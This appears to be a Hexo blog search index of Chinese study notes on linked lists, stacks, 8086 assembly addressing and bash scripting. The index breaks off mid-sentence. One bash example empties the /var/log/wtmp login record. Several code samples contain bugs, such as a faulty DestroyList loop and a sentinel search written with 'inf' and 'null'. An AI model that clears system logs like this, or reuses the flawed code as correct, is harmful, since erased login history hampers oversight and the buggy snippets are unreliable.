<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linked List]]></title>
    <url>%2F2018%2F10%2F25%2FLinked-List%2F</url>
    <content type="text"><![CDATA[LinkList.h123456789101112131415161718192021222324#ifndef LINKLIST_H#define LINKLIST_H#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;typedef char ElemType;typedef struct LNode &#123; ElemType data; struct LNode*next;&#125;LinkList;void CreateListHead(LinkList *&amp;L,ElemType a[],int n);void CreateListTail(LinkList *&amp;L,ElemType a[],int n);void InitList(LinkList *&amp;L);void DestroyList(LinkList *&amp;L);bool ListEmpty(LinkList *L);int ListLength(LinkList *L);void ShowList(LinkList *L);bool GetListElem(LinkList *L,int i,ElemType &amp;e);int LocateElem(LinkList*L,ElemType e);bool ListInsert(LinkList *&amp;L,int i,ElemType e);bool ListDelete(LinkList *&amp;L,int i,ElemType &amp;e);#endif LinkList.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#include "LinkList.h"void CreateListHead(LinkList *&amp;L,ElemType a[],int n)&#123; int i; LinkList *s; L = (LinkList *)malloc(sizeof(LinkList)); L-&gt;next = NULL; for(i = 0;i &lt; n;i++) &#123; s=(LinkList*)malloc(sizeof(LinkList)); s-&gt;data = a[i]; s-&gt;next = L-&gt;next; L-&gt;next = s; &#125;&#125;void CreateListTail(LinkList *&amp;L,ElemType a[],int n)&#123; int i; LinkList * s,* r; L = (LinkList *)malloc(sizeof(LinkList)); r = L; for(i = 0;i &lt; n;i++) &#123; s = (LinkList *)malloc(sizeof(LinkList)); s-&gt;data = a[i]; r-&gt;next = s; r = s; &#125; r-&gt;next = NULL; &#125;void InitList(LinkList *&amp;L)&#123; L=(LinkList *)malloc(sizeof(LinkList)); L-&gt;next = NULL;&#125;void DestroyList(LinkList *&amp;L)&#123; LinkList * pre = L,*p = L-&gt;next; while(p!=NULL) &#123; free(pre); pre = p; p = L-&gt;next; &#125; free(pre);&#125;bool ListEmpty(LinkList *L)&#123; return(L-&gt;next==NULL); &#125;int ListLength(LinkList *L)&#123; int n = 0; LinkList * p = L; while(p-&gt;next!=NULL) &#123; n++; p=p-&gt;next; &#125; return(n);&#125;void ShowList(LinkList *L)&#123; LinkList * p = L-&gt;next;//Ö¸Ïò¿ªÊ¼½Úµã while(p!=NULL) &#123; printf(" %c ",p-&gt;data); p = p-&gt;next; &#125; printf("\n");&#125;bool GetListElem(LinkList *L,int i,ElemType &amp;e)&#123; int j = 0; LinkList *p = L; while(j&lt;i&amp;&amp;p!=NULL) &#123; j++; p=p-&gt;next; &#125; if(p==NULL) return false; else &#123; e=p-&gt;data; return true; &#125;&#125;int LocateElem(LinkList*L,ElemType e)&#123; int i=1; LinkList *p = L-&gt;next; while(p!=NULL&amp;&amp;p-&gt;data!=e)&#123; p=p-&gt;next; i++; &#125; if(p==NULL) &#123; return(0); &#125; else return(i);&#125;bool ListInsert(LinkList *&amp;L,int i,ElemType e)&#123; int j=0; LinkList *p =L,*s; while(j&lt;i-1&amp;&amp;p!=NULL) &#123; j++; p=p-&gt;next; &#125; if(p==NULL) &#123; return false; &#125; else &#123; s= (LinkList*)malloc(sizeof(LinkList)); s-&gt;data = e; s-&gt;next = p-&gt;next; p-&gt;next = s; return true; &#125;&#125;bool ListDelete(LinkList *&amp;L,int i,ElemType &amp;e)&#123; int j=0; LinkList * p =L,*q; while(j&lt;i-1&amp;&amp;p!=NULL) &#123; j++; p=p-&gt;next; &#125; if(p==NULL) return false; else &#123; q=p-&gt;next; if(q==NULL) return false; e=q-&gt;data; p-&gt;next=q-&gt;next; free(q); return true; &#125;&#125; 哨兵链表中的“哨兵”节点是解决边界问题的，不参与业务逻辑。如果我们引入“哨兵”节点，则不管链表是否为空，head指针都会指向这个“哨兵”节点。我们把这种有“哨兵”节点的链表称为带头链表，相反，没有“哨兵”节点的链表就称为不带头链表。 举个栗子:code1:未利用哨兵12345678910111213141516171819// 在数组 a 中，查找 key，返回 key 所在的位置// 其中，n 表示数组 a 的长度int find(char* a, int n, char key) &#123; // 边界条件处理，如果 a 为空，或者 n&lt;=0，说明数组中没有数据，就不用 while 循环比较了 if(a == null || n &lt;= 0) &#123; return -1; &#125; int i = 0; // 这里有两个比较操作：i&lt;n 和 a[i]==key. while (i &lt; n) &#123; if (a[i] == key) &#123; return i; &#125; ++i; &#125; return -1;&#125; code2:利用哨兵1234567891011121314151617181920212223242526272829303132333435363738// 在数组 a 中，查找 key，返回 key 所在的位置// 其中，n 表示数组 a 的长度// 我举 2 个例子，你可以拿例子走一下代码// a = &#123;4, 2, 3, 5, 9, 6&#125; n=6 key = 7// a = &#123;4, 2, 3, 5, 9, 6&#125; n=6 key = 6inf find(char* a, int n, char key) &#123; if(a == null || n &lt;= 0) &#123; return -1; &#125; // 这里因为要将 a[n-1] 的值替换成 key，所以要特殊处理这个值 if (a[n-1] == key) &#123; return n-1; &#125; // 把 a[n-1] 的值临时保存在变量 tmp 中，以便之后恢复。tmp=6。 // 之所以这样做的目的是：希望 find() 代码不要改变 a 数组中的内容 char tmp = a[n-1]; // 把 key 的值放到 a[n-1] 中，此时 a = &#123;4, 2, 3, 5, 9, 7&#125; a[n-1] = key; int i = 0; // while 循环比起代码一，少了 i&lt;n 这个比较操作 while (a[i] != key) &#123; ++i; &#125; // 恢复 a[n-1] 原来的值, 此时 a= &#123;4, 2, 3, 5, 9, 6&#125; a[n-1] = tmp; if (i == n-1) &#123; // 如果 i == n-1 说明，在 0...n-2 之间都没有 key，所以返回 -1 return -1; &#125; else &#123; // 否则，返回 i，就是等于 key 值的元素的下标 return i; &#125;&#125; tips：使用哨兵的思想。]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Stack]]></title>
    <url>%2F2018%2F10%2F25%2FStack%2F</url>
    <content type="text"><![CDATA[思维导图： 链式栈 StackBasedOnLinkedList.h1234567891011121314151617181920// 类模板的声明，关键字 class 也可以更换成 typenametemplate&lt;class T&gt; class LinkedListStack&#123;public: LinkedListStack(); ~LinkedListStack(); void push(const T &amp; data); //入栈 T peek(); //返回栈顶元素，即出栈，不删除栈顶元素 T pop(); //出栈，删除栈顶元素 int size() const; //返回栈的大小private: int count; //存放栈的大小，因为是单链表所以这里不规定栈的最大可承载量 struct LinkedNode &#123; T data; LinkedNode * next; &#125;; LinkedNode * head; // 单链表的头指针，不带头节点&#125;; StackBasedOnLinkedList.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127/** * 1）链式栈的操作：入栈，出栈以及返回栈的大小； * 2）采用模板的方法实现存储任意类型的数据 * 3）采用单链表实现栈 * 4）pop和peek 出栈的返回值稍微有点问题，当栈为空的时候，返回null，cpp默认返回的是0。 * * 改进方法就是不用函数的返回值返回栈顶元素，而是采用参数列表的形式返回，这样稍微有点麻烦 * * 或者就是在使用的时候先调用size函数判断以下 * Author：caozx * time ；2018年10月11日 */#include &lt;iostream&gt;#include "StackBasedOnLinkedList.h"using namespace std;template&lt;class T&gt; LinkedListStack&lt;T&gt;::LinkedListStack()&#123; this -&gt; count = 0; this -&gt; head = new LinkedNode; this -&gt; head -&gt; next = NULL;&#125;template&lt;class T&gt; LinkedListStack&lt;T&gt;::~LinkedListStack()&#123; LinkedNode * ptr, * temp; ptr = head; while(ptr -&gt; next != NULL)&#123; temp = ptr -&gt; next; ptr -&gt; next = temp -&gt; next; delete temp; &#125; delete head ; //删除头节点 this -&gt; head = NULL; this -&gt; count = 0;&#125;// 入栈template&lt;class T&gt; void LinkedListStack&lt;T&gt;::push(const T &amp; data)&#123; LinkedNode * insertPtr = new LinkedNode; insertPtr -&gt; data = data; insertPtr -&gt; next = this -&gt; head -&gt; next; head -&gt; next = insertPtr; this -&gt; count ++; cout &lt;&lt; "push data : " &lt;&lt; this -&gt; head -&gt; next -&gt; data &lt;&lt; endl; &#125;//返回栈顶元素，即出栈，不删除栈顶元素template&lt;class T&gt; T LinkedListStack&lt;T&gt;::peek()&#123; if(this -&gt; count == 0 || this -&gt; head -&gt; next == NULL)&#123; cout &lt;&lt; " stack is empty, peek fail"&lt;&lt; endl; return NULL; &#125; else&#123; return this -&gt; head -&gt; next -&gt; data; &#125;&#125;//出栈，删除栈顶元素template&lt;class T&gt; T LinkedListStack&lt;T&gt;::pop()&#123; if(this -&gt; count == 0 || this -&gt; head -&gt; next == NULL)&#123; cout &lt;&lt; " stack is empty, pop fail"&lt;&lt; endl; return NULL; &#125; else&#123; LinkedNode * temp = this -&gt; head -&gt; next; this -&gt; head -&gt; next = temp -&gt; next; T data = temp -&gt; data; delete temp; this -&gt; count --; return data; &#125;&#125;//返回栈的大小template&lt;class T&gt; int LinkedListStack&lt;T&gt;::size() const&#123; return this -&gt; count;&#125; int main(int argc, char const *argv[])&#123; cout &lt;&lt; " === StackBasedOnLinkedList test begin ===" &lt;&lt; endl; LinkedListStack &lt;float&gt; stack; cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; stack.push(10.1); stack.push(20.2); stack.push(30.); stack.push(40.4); stack.push(50.5); stack.push(60.6); cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; "stack peek " &lt;&lt; stack.peek() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack peek " &lt;&lt; stack.peek() &lt;&lt; endl; stack.push(110.1); stack.push(120.2); stack.push(130.3); stack.push(140.4); stack.push(150.5); stack.push(160.6); cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; "stack peek " &lt;&lt; stack.peek() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack peek " &lt;&lt; stack.peek() &lt;&lt; endl; //peek cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; cout &lt;&lt; "size==="&lt;&lt;stack.size()&lt;&lt;endl; cout &lt;&lt; "stack peek " &lt;&lt; stack.peek() &lt;&lt; endl; //peek cout &lt;&lt; "stack pop " &lt;&lt; stack.pop() &lt;&lt; endl; system("pause"); return 0;&#125; 顺序栈 StackBasedOnArray.h12345678910111213141516171819// 类模板的声明(line 3)，类模板实例化后就是模板类// 类模板声明的写法 template &lt;class T&gt; class 类名&#123;&#125;template &lt;class T&gt; class ArrayStack&#123;public: ArrayStack(); ArrayStack(int count); ~ArrayStack(); void push(T data); //入栈 T pop(); //出栈，并删除栈顶元素 T peek(); //返回栈顶元素，不删除栈顶元素，栈顶指针不变 int stackSize(); int stackMaxSize();private: int flag; //栈顶标签，指向栈顶 int count ; //栈的容量 T *array; //指针&#125;; StackBasedOnArray.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122/** * 1）顺序栈的操作：入栈和出栈； * 2）采用模板的方法实现存储任意类型的数据 * 3）采用数组的栈，支持动态扩容，每次扩容1.5 倍，初始栈的大小是 10 。 * * Author：caozx * time ；2018年10月11日 */#include &lt;iostream&gt;#include "StackBasedOnArray.h"using namespace std;//构造函数，创建栈//类模板成员函数的写法 template&lt;class T&gt; 返回值类型 类名&lt;T&gt;::成员函数名(参数列表)&#123;&#125;template&lt;class T&gt; ArrayStack&lt;T&gt;::ArrayStack() &#123; this -&gt; count = 10; this -&gt; flag = 0; this -&gt; array = new T[this -&gt; count]; if (! this -&gt; array)&#123; cout &lt;&lt; "array malloc memory failure" &lt;&lt; endl; &#125;&#125;//有参构造函数，创建栈template&lt;class T&gt; ArrayStack&lt;T&gt;::ArrayStack(int count) &#123; this -&gt; count = count; this -&gt; flag = 0; this -&gt; array = new T[this -&gt; count]; if (! this -&gt; array)&#123; cout &lt;&lt; "array malloc memory failure" &lt;&lt; endl; &#125;&#125;//析构函数，销毁栈template &lt;class T&gt; ArrayStack&lt;T&gt;::~ArrayStack()&#123; this -&gt; count = 0; this -&gt; flag = 0; if(this -&gt; array)&#123; delete [] this -&gt; array; this -&gt; array = NULL; &#125; &#125; // 入栈template&lt;class T&gt; void ArrayStack&lt;T&gt;::push(T data)&#123; if(this -&gt; flag == this -&gt; count)&#123; cout &lt;&lt; "The stack is full , so need to enlarge 1.5x! "&lt;&lt; endl; this -&gt; count = int (1.5 * this -&gt; count); T * temp = new T [this -&gt; count]; for(int i = 0; i &lt; this -&gt; flag ; i++)&#123; temp[i] = this -&gt; array[i]; //cout &lt;&lt; temp[i] &lt;&lt;endl; &#125; delete [] this -&gt; array; //释放原来的空间 temp[this -&gt; flag] = data; this -&gt; flag ++; this -&gt; array = temp; &#125; else&#123; this -&gt; array [this -&gt; flag] = data; this -&gt; flag ++ ; &#125;&#125;//出栈，并删除栈顶元素template&lt;class T&gt; T ArrayStack&lt;T&gt;::pop()&#123; this -&gt; flag --; T temp = this -&gt; array[this -&gt; flag]; return temp;&#125;//出栈，不删除栈顶元素template&lt;class T&gt; T ArrayStack&lt;T&gt;::peek()&#123; T temp = this -&gt; array[this -&gt; flag - 1]; return temp;&#125;template&lt;class T&gt; int ArrayStack&lt;T&gt;::stackSize()&#123; return this -&gt; flag;&#125;template&lt;class T&gt; int ArrayStack&lt;T&gt;::stackMaxSize()&#123; return this -&gt; count;&#125;int main(int argc, char const *argv[])&#123; cout &lt;&lt; " === test begin ===" &lt;&lt; endl; ArrayStack &lt;int&gt; arrstack(12); arrstack.push(10); arrstack.push(20); arrstack.push(30); arrstack.push(40); arrstack.push(50); arrstack.push(60); arrstack.push(70); arrstack.push(80); arrstack.push(90); arrstack.push(100); arrstack.push(110); arrstack.push(120); arrstack.push(130); arrstack.push(140); arrstack.push(150); cout &lt;&lt; "peek , not delete " &lt;&lt; arrstack.peek() &lt;&lt; endl; cout &lt;&lt; "pop , delete " &lt;&lt; arrstack.pop()&lt;&lt;endl; arrstack.push(210); arrstack.push(220); cout &lt;&lt; "peek , not delete " &lt;&lt; arrstack.peek() &lt;&lt; endl; cout &lt;&lt; "pop , delete " &lt;&lt; arrstack.pop()&lt;&lt;endl; system("pause"); return 0;&#125; 思考 函数中存在的嵌套，使用栈来存储临时变量，能够满足里层函数计算的结果返回给外层函数（逐级向外）的需求。 内存中的堆栈和数据结构堆栈不是一个概念，可以说内存中的堆栈是真实存在的物理区，数据结构中的堆栈是抽象的数据存储结构。内存空间在逻辑上分为三部分：代码区、静态数据区和动态数据区，动态数据区又分为栈区和堆区。代码区：存储方法体的二进制代码。高级调度（作业调度）、中级调度（内存调度）、低级调度（进程调度）控制代码区执行代码的切换。静态数据区：存储全局变量、静态变量、常量，常量包括final修饰的常量和String常量。系统自动分配和回收。栈区：存储运行方法的形参、局部变量、返回值。由系统自动分配和回收。堆区：new一个对象的引用或地址存储在栈区，指向该对象存储在堆区中的真实数据。]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Assembly language]]></title>
    <url>%2F2018%2F10%2F24%2FAssembly-language%2F</url>
    <content type="text"><![CDATA[一 DOS及DEBUG介绍：DEBUG的主要命令DEBUG命令有20多个，我们主要学习最常用的命令。R ——查看和修改寄存器D ——查看内存单元E ——修改内存单元U ——反汇编，将机器指令变为汇编指令T /P——单步执行G ——连续执行程序A ——输入汇编指令Q ——退出 本书用到的简单的DOS命令：cd\ ——首先要用cd\ 退回到根目录C&gt;下dir ——显示文件列表md hb ——建立hb子目录cd hb ——进入hb子目录copy d:\dos\masm.exe c:\hb ——将D盘dos目录下的masm.exe拷贝到C盘hb目录下copy d:\dos\link.exe c:\hb ——将D盘dos目录下的link.exe拷贝到C盘hb目录下cd .. ——退回到上一级目录del \hb\masm.exe ——删除hb子目录中的某文件rd hb ——删除hb子目录（子目录中的所有文件必须先删除）e：——进入e盘cls ——清屏type——显示文本文件内容（如type c:\hb\abc.asm） 数的补码表示:在计算机中，对带符号数可用真值和机器数两个概念表示。真值，就是带有“+”、“-”号的实际数值；所谓机器数，则是把“+”、“-”符号数值化（0、1）后所得到的计算机实际能表示的数。机器数有三种码表示，分别是原码、反码和补码。汇编语言中，数都是以补码的形式表示的，因此必须掌握数的补码表示和补码的运算。这三种码的定义如下：原码。原码将最高位作为符号位，正数为0，负数为1，其余7位作为数值位。反码。正数的反码与正数的原码一样。而求负数的反码时，符号位为1，数值位在原码的基础上求反。补码。正数的补码与正数的原码一样。求负数的补码时，符号位为1，数值位在原码的基础上求反加1。例 十进制数+5和-5分别表示成二进制数原码、反码和补码。[+5]原=[+5]反=[+5]补=00000101B[-5]原=10000101B[-5]反=11111010B[-5]补=11111011B 8086寄存器组8086寄存器都是16位的寄存器，根据用途可分为4种类型。分别是数据寄存器、地址寄存器、段寄存器和控制寄存器。如图所示。 img 数据寄存器中每个寄存器又可以分为2个8位的寄存器。分别为AH、AL，BH、BL，CH、CL，DH、DL。H表示高字节（高8位）寄存器、L表示低字节（低8位）寄存器。例如 用AX寄存器存放一个字1234H，表示为(AX)=1234H，即高字节12放在AH，低字节34放在AL中。 地址寄存器包括指针和变址寄存器SP、BP、SI、DI四个16位寄存器。顾名思义，它们可用来存放存储器操作数的偏移地址。另外，它们也可以作为通用寄存器用。 8086CPU有4个16位的段寄存器，分别是CS代码段寄存器、DS数据段寄存器、ES附加段寄存器、SS堆栈段寄存器。 8086寄存器组8086寄存器都是16位的寄存器，根据用途可分为4种类型。分别是数据寄存器、地址寄存器、段寄存器和控制寄存器。如图所示。 img 数据寄存器中每个寄存器又可以分为2个8位的寄存器。分别为AH、AL，BH、BL，CH、CL，DH、DL。H表示高字节（高8位）寄存器、L表示低字节（低8位）寄存器。例如 用AX寄存器存放一个字1234H，表示为(AX)=1234H，即高字节12放在AH，低字节34放在AL中。 地址寄存器包括指针和变址寄存器SP、BP、SI、DI四个16位寄存器。顾名思义，它们可用来存放存储器操作数的偏移地址。另外，它们也可以作为通用寄存器用。 8086CPU有4个16位的段寄存器，分别是CS代码段寄存器、DS数据段寄存器、ES附加段寄存器、SS堆栈段寄存器。 DOS命令用法 列表项目DIR == 进入根目录CD [filename] == 进入子目录 DEBUG命令用法通过改变IP的值可以在不同的位置进行–输入汇编指令和反汇编。 tips: 在做的过程中遇到十进制转十六进制这样的问题，自己算！（怎么可能…）想到了以前用Python时进行的进制转换用着还是比较方便的。123456789101112131415# 十进制转十六进制&gt;&gt;&gt; hex(56)'0x38'# 十六进制转十进制&gt;&gt;&gt; int('0xFFF', 16)4095# 二进制转十进制&gt;&gt;&gt; int('11101', 2)29# 八进制转十进制&gt;&gt;&gt; int('764', 8)500# 二进制转十六进制&gt;&gt;&gt; hex(int('11101', 2))'0x1d' 是不是特别方便^_^more 二 寻址方式:汇编指令由操作码字段和操作数字段构成。对于双操作指令，第一个操作数称为目的操作数，表示操作后的结果；第二个操作数称为源操作数，表示来源操作数。两者以逗号分隔。如： img 所谓寻址方式，即指令中提供操作数或操作数地址的方式。通俗地说就是寻找操作数地址的方法。寻址方式的数量代表了微机系统对存储器管理能力的强弱，合理地使用寻址方式可以扩大访存空间，缩短指令长度，满足各种程序设计需要。与数据有关的寻址方式划分为三类：立即寻址方式，寄存器寻址方式，存储器寻址方式。 立即寻址方式所要找的操作数直接写在指令中，这种操作数叫立即数。在8086、80286中立即数是8位或16位的，在80386以上可以是32位的立即数。立即寻址方式用来表示常数。123456-AMOV AX，3060MOV AL，5MOV BL，FFMOV BX，A46D MOV CX，17 寄存器寻址方式在寄存器寻址方式中，操作数在寄存器中，在指令中指定寄存器名即可。 123456-AMOV AX，0MOV BX，1234MOV AX，BXMOV CL，AHMOV AX，4650 直接寻址方式操作数存放在内存中。操作数的偏移地址（也称为有效地址EA）直接写在指令中。 （1）存储器读操作 MOV指令可以实现CPU对存储器的读写。若传送指令的目的操作数是CPU的寄存器，源操作数是存储单元，就完成了对存储器的读操作。 例1 MOV AX，DS:[2000H]该指令表示从数据段的2000H单元读出一个字送入AX。 （2）存储器写操作 如果要实现CPU写内存操作，只要把MOV指令的目的操作数变为存储单元，源操作数为CPU的寄存器即可。 例2 MOV DS:[4000H]，AX将AX的值写入数据段的4000H单元。123-AMOV AX，DS:[2000]MOV DS:[4000]，AX 寄存器间接寻址方式操作数存放在内存中。指令形式如： MOV AX，[BX]操作数的EA在基址寄存器BX、BP或变址寄存器SI、DI中，而操作数的段地址在数据段DS或堆栈段SS中。如果有效地址由BX、SI、DI指出，则默认为对应于数据段，而用BP指出则对应于堆栈段。123456-R DS 1500-E DS:4580 64 23-D DS:4580-AMOV BX，4580MOV AX，[BX] 寄存器相对寻址方式操作数存放在内存中。指令形式如： MOV AX，[BX+1200H]操作数的EA是一个基址或变址寄存器的内容再加上8位或16位位移量之和。也就是说在寄存器间接寻址的基础上，增加一个相对量（位移量）。这个位移量可以是立即数，也可以是符号地址。 123456-R DS 1500-E DS:7335 28 24-D DS:7335-AMOV SI，7310MOV AX，25[SI] 基址变址寻址方式操作数存放在内存中。指令形式如： MOV AX，[BX+SI]操作数的EA为一个基址寄存器和一个变址寄存器的内容之和。 相对基址变址寻址方式操作数存放在内存中。指令形式如： MOV AX，[BX+SI+1200H]操作数的EA为一个基址寄存器加一个变址寄存器再加一个位移量，三者之和。可用于二维表查表和栈处理。 实验任务 实验目的 通过实验观察和分析在不同的寻址方式下存储单元逻辑地址的表示以及指令的执行结果。熟练掌握DEBUG的R命令、A命令、T命令和D命令的用法。 实验内容 参考示例一和各种寻址方式完成下列实验内容： （1）两个操作数相减运算，结果放在数据段的16号单元。 1）AX、BX寄存器分别赋值为0008H和0010H。2）AX和BX的内容相减（SUB指令），结果在AX中。3）用直接寻址方式将相减的结果保存到16号单元。 （2）两个操作数相加运算，结果放在附加段的0020H号单元。 1）AX的值为0034H。2）AX和65相加，结果在AX中。3）用寄存器间接寻址方式（段超越）保存运算结果。 （3）将AX寄存器中的1234H写入数据段的2号单元，读出3号单元的12H传送给BL寄存器。（寻址方式自定） 实验要求 （1）写出相关命令及操作步骤（2）实验内容用截图形式记录实验结果（3）写出实验结果分析。]]></content>
      <categories>
        <category>assembly</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leetcode commemoration day]]></title>
    <url>%2F2018%2F10%2F24%2Fleetcode-commemoration-day%2F</url>
    <content type="text"><![CDATA[100题纪念：]]></content>
      <categories>
        <category>commemoration day</category>
      </categories>
      <tags>
        <tag>commemoration day</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Advanced bash scripting guide]]></title>
    <url>%2F2018%2F10%2F21%2FAdvanced-bash-scripting-guide%2F</url>
    <content type="text"><![CDATA[1.使用脚本清除文件123456789101112#!/bin/bash# 初始化一个变量LOG_DIR=/var/logcd $LOG_DIRcat /dev/null &gt; wtmpecho "Logs cleaned up."exit 2.命令分隔符 12345678#!/bin/bashecho hello; echo therefilename=ttt.shif [ -e "$filename" ]; then # 注意: "if"和"then"需要分隔，-e用于判断文件是否存在 echo "File $filename exists."; cp $filename $filename.bakelse echo "File $filename not found."; touch $filenamefi; echo "File test complete." 3.终止case选项（双分号）12345678#!/bin/bashvarname=bcase "$varname" in [a-z]) echo "abc";; [0-9]) echo "123";;esac 4.等价于 source 命令1234$ source test.shHello World$ . test.shHello World 5.双引号（”)“STRING” 将会阻止（解释）STRING中大部分特殊的字符。后面的实验会详细说明。 6.单引号（’）‘STRING’ 将会阻止STRING中所有特殊字符的解释，这是一种比使用”更强烈的形式。后面的实验会详细说明。 区别：1234567HOME='shiyanlou'echo $HOME&gt;&gt; shiyanlouecho '$HOME'&gt;&gt; '$HOME'echo "$HOME"&gt;&gt; shiyanlou 7.斜线（/）文件名路径分隔符。分隔文件名不同的部分（如/home/bozo/projects/Makefile）。也可以用来作为除法算术操作符。注意在linux中表示路径的时候，许多个/跟一个/是一样的。/home/shiyanlou等同于////home///shiyanlou 8.反斜线（\）一种对单字符的引用机制。\X 将会“转义”字符X。这等价于”X”，也等价于’X’。\ 通常用来转义双引号（”）和单引号（’），这样双引号和单引号就不会被解释成特殊含义了。 符号 说明\n 表示新的一行\r 表示回车\t 表示水平制表符\v 表示垂直制表符\b 表示后退符\a 表示”alert”(蜂鸣或者闪烁)\0xx 转换为八进制的ASCII码, 等价于0xx“ 表示引号字面的意思转义符也提供续行功能，也就是编写多行命令的功能。 9.命令替换反引号中的命令会优先执行，如：12$ cp `mkdir back` test.sh back$ ls 先创建了 back 目录，然后复制 test.sh 到 back 目录 10.空命令(:)等价于“NOP”（no op，一个什么也不干的命令）。也可以被认为与shell的内建命令true作用相同。“:”命令是一个bash的内建命令，它的退出码（exit status）是（0）。 如：123456#!/bin/bashwhile :do echo "endless loop"done 等价于123456#!/bin/bashwhile truedo echo "endless loop"done 可以在 if/then 中作占位符：123456789#!/bin/bashcondition=5if [ $condition -gt 0 ] #gt表示greater than，也就是大于，同样有-lt（小于），-eq（等于） then : # 什么都不做，退出分支else echo "$condition"fi 11.变量扩展/子串替换在与&gt;重定向操作符结合使用时，将会把一个文件清空，但是并不会修改这个文件的权限。如果之前这个文件并不存在，那么就创建这个文件。123$ : &gt; test.sh # 文件“test.sh”现在被清空了# 与 cat /dev/null &gt; test.sh 的作用相同# 然而,这并不会产生一个新的进程, 因为“:”是一个内建命令 11.测试操作符(?)12345#!/bin/basha=10(( t=a&lt;50?8:9 ))echo $t 12.小括号（）1）局部变量123456#!/bin/basha=123( a=321; )echo "$a" #a的值为123而不是321，因为括号将判断为局部变量 2）初始化数组1234#!/bin/basharr=(1 4 5 7 9 21)echo $&#123;arr[3]&#125; # get a value of arr 13.大括号{}1）复制 t.txt 的内容到 t.back 中12345678#!/bin/bashif [ ! -w 't.txt' ];then touch t.txtfiecho 'test text' &gt;&gt; t.txtcp t.&#123;txt,back&#125; 2）代码块代码块，又被称为内部组，这个结构事实上创建了一个匿名函数（一个没有名字的函数）。然而，与“标准”函数不同的是，在其中声明的变量，对于脚本其他部分的代码来说还是可见的。12345#!/bin/basha=123&#123; a=321; &#125;echo "a = $a" result:a = 321 14.中括号[]1)条件测试123456789#!/bin/basha=5if [ $a -lt 10 ]then echo "a: $a"else echo 'a&gt;10'fi 2)数组元素12345#!/bin/basharr=(12 22 32)arr[0]=10echo $&#123;arr[0]&#125; 15.尖括号&lt;&gt;重定向test.sh &gt; filename：重定向test.sh的输出到文件 filename 中。如果 filename 存在的话，那么将会被覆盖。 test.sh &amp;&gt; filename：重定向 test.sh 的 stdout（标准输出）和 stderr（标准错误）到 filename 中。 test.sh &gt;&amp;2：重定向 test.sh 的 stdout 到 stderr 中。 test.sh &gt;&gt; filename：把 test.sh 的输出追加到文件 filename 中。如果filename 不存在的话，将会被创建。 16.竖线（|）管道分析前边命令的输出，并将输出作为后边命令的输入。这是一种产生命令链的好方法。1234#!/bin/bashtr 'a-z' 'A-Z'exit 0 现在让我们输送ls -l的输出到一个脚本中：12$ chmod 755 test26.sh$ ls -l | ./test26.sh 输出的内容均变为了大写字母。 17.破折号-1）选项，前缀在所有的命令内如果想使用选项参数的话,前边都要加上“-”。12345678#!/bin/basha=5b=5if [ "$a" -eq "$b" ]then echo "a is equal to b."fi 2)用于重定向stdin或stdout12345678910111213#!/bin/bashBACKUPFILE=backup-$(date +%m-%d-%Y)# 在备份文件中嵌入时间.archive=$&#123;1:-$BACKUPFILE&#125;# 如果在命令行中没有指定备份文件的文件名,# 那么将默认使用"backup-MM-DD-YYYY.tar.gz".tar cvf - `find . -mtime -1 -type f -print` &gt; $archive.targzip $archive.tarecho "Directory $PWD backed up in archive file \"$archive.tar.gz\"."exit 0 18.波浪号~目录~ 表示 home 目录。 21.只读变量使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。 下面的例子尝试更改只读变量，结果报错：1234#!/bin/bashmyUrl="http://www.shiyanlou.com"readonly myUrlmyUrl="http://www.shiyanlou.com" 运行脚本，结果如下： /bin/sh: NAME: This variable is read only. 22.特殊变量1)局部变量这种变量只有在代码块或者函数中才可见。后面的实验会详细讲解。 2)环境变量这种变量将影响用户接口和 shell 的行为。 在通常情况下，每个进程都有自己的“环境”，这个环境是由一组变量组成的，这些变量中存有进程可能需要引用的信息。在这种情况下，shell 与一个一般的进程没什么区别。 3)位置参数从命令行传递到脚本的参数：$0，$1，$2，$3… $0就是脚本文件自身的名字，$1 是第一个参数，$2 